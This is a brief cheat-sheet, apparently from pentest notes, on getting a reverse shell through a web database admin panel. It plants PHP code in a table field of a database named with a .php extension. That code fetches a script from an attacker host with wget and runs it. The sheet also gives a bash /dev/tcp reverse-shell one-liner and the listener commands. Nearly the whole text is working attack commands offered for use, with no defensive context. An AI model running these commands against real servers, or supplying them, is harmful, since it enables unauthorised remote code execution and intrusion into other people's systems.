### Get reverse shell using php code
```
Create New Database > <databaseName>.php > Create
Change Database > <databaseName>.php > Structure > Create new table on database '<databaseName>.php' > Name: <tableName> > Number of Fields: 1 > Go
Field: <?php exec("wget <lhost>/<revShell> -O /tmp/sh && bash /tmp/sh"); ?> > Type: Text > Create
```

### Get path to php file
```
Change Database > <databaseName>.php > Path to database
```

### Generate reverse shell
```
echo "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1" > <revShell>
```

### Start listener
```
python3 -m http.server 80
nc -lnvp <lport>
```

